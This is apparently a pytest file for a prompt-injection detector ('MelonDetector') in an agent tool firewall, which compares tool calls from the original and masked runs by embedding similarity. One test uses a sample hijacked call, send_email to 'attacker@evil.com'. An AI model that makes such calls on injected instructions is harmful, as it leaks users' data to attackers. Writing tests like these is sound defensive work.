"""Tests for agentguard.tool_firewall.melon_detector (Component 2 — MELON)."""

import pytest
import numpy as np
from unittest.mock import patch, MagicMock

from agentguard.tool_firewall.melon_detector import MelonDetector, _cosine_similarity


def _make_tool_call(name, arguments):
    tc = MagicMock()
    tc.function.name = name
    tc.function.arguments = arguments
    tc.id = f"call_{name}"
    tc.type = "function"
    return tc


def _make_chat_response(tool_calls=None, content=None):
    response = MagicMock()
    msg = MagicMock()
    msg.tool_calls = tool_calls
    msg.content = content
    response.choices = [MagicMock()]
    response.choices[0].message = msg
    return response


def _make_embedding(vector):
    response = MagicMock()
    data_item = MagicMock()
    data_item.embedding = vector
    response.data = [data_item]
    return response


@pytest.fixture
def detector():
    with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
        d = MelonDetector(
            api_key="test-key",
            base_url="https://test.gateway.ai",
            model="test-model",
            threshold=0.8,
        )
    return d


SAMPLE_MESSAGES = [
    {"role": "system", "content": "You are a helpful assistant."},
    {"role": "user", "content": "Read my inbox"},
    {"role": "assistant", "content": None, "tool_calls": [
        {"id": "call_1", "type": "function", "function": {"name": "read_inbox", "arguments": "{}"}}
    ]},
    {"role": "tool", "tool_call_id": "call_1", "content": "You have 3 new messages."},
]

SAMPLE_SCHEMAS = [
    {"type": "function", "function": {"name": "read_inbox", "parameters": {}}},
    {"type": "function", "function": {"name": "send_email", "parameters": {}}},
]


class TestMelonDetector:

    def test_no_messages_passes(self, detector):
        result = detector.check_tool_output([], SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_non_tool_message_passes(self, detector):
        messages = [{"role": "user", "content": "hello"}]
        result = detector.check_tool_output(messages, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_no_tool_calls_in_original_passes(self, detector):
        """If LLM doesn't produce tool calls after seeing tool output, no injection."""
        original_response = _make_chat_response(tool_calls=None, content="Here's a summary.")
        detector.client.chat.completions.create.return_value = original_response

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_injection_detected_high_similarity(self, detector):
        """When original and masked produce similar tool calls → injection."""
        # Original run: produces send_email tool call
        orig_tc = _make_tool_call("send_email", '{"to": "attacker@evil.com"}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        # Masked run: also produces send_email (same behavior in different context = injection)
        masked_tc = _make_tool_call("send_email", '{"to": "attacker@evil.com"}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        detector.client.chat.completions.create.side_effect = [original_response, masked_response]

        # Both embeddings are nearly identical → high cosine similarity
        similar_vec = np.array([1.0, 0.0, 0.0])
        detector.client.embeddings.create.return_value = _make_embedding(similar_vec)

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert "prompt injection" in result.blocked_reason.lower()
        assert result.details.get("redacted_output") is not None

    def test_safe_output_low_similarity(self, detector):
        """When original and masked produce different tool calls → safe."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        masked_tc = _make_tool_call("summarize", '{"text": "..."}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        detector.client.chat.completions.create.side_effect = [original_response, masked_response]

        # Return different embeddings for each call
        call_count = [0]
        def mock_embed(**kwargs):
            call_count[0] += 1
            if call_count[0] <= 1:
                # Masked embedding
                return _make_embedding(np.array([1.0, 0.0, 0.0]))
            else:
                # Original embedding — orthogonal = 0 similarity
                return _make_embedding(np.array([0.0, 1.0, 0.0]))

        detector.client.embeddings.create.side_effect = mock_embed

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_no_masked_tool_calls_passes(self, detector):
        """If masked run produces no tool calls, no comparison → safe."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        original_response = _make_chat_response(tool_calls=[orig_tc])
        masked_response = _make_chat_response(tool_calls=None, content="Summary of contents.")

        detector.client.chat.completions.create.side_effect = [original_response, masked_response]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_api_error_blocks_as_failsafe(self, detector):
        detector.client.chat.completions.create.side_effect = Exception("API timeout")

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert "fail-safe" in result.blocked_reason

    def test_reset_clears_banks(self, detector):
        detector._masked_tool_call_bank.add("test_call")
        detector._masked_tool_emb_bank.append(np.array([1, 2, 3]))
        detector.reset()
        assert len(detector._masked_tool_call_bank) == 0
        assert len(detector._masked_tool_emb_bank) == 0

    def test_missing_credentials_raises(self):
        with patch.dict("os.environ", {"TFY_API_KEY": "", "TFY_BASE_URL": ""}):
            with pytest.raises(ValueError, match="TFY_API_KEY"):
                MelonDetector(api_key="", base_url="")


class TestCosineHelper:

    def test_identical_vectors(self):
        v = np.array([1.0, 2.0, 3.0])
        assert abs(_cosine_similarity(v, v) - 1.0) < 1e-6

    def test_orthogonal_vectors(self):
        a = np.array([1.0, 0.0])
        b = np.array([0.0, 1.0])
        assert abs(_cosine_similarity(a, b)) < 1e-6

    def test_zero_vector(self):
        a = np.array([0.0, 0.0])
        b = np.array([1.0, 1.0])
        assert _cosine_similarity(a, b) == 0.0
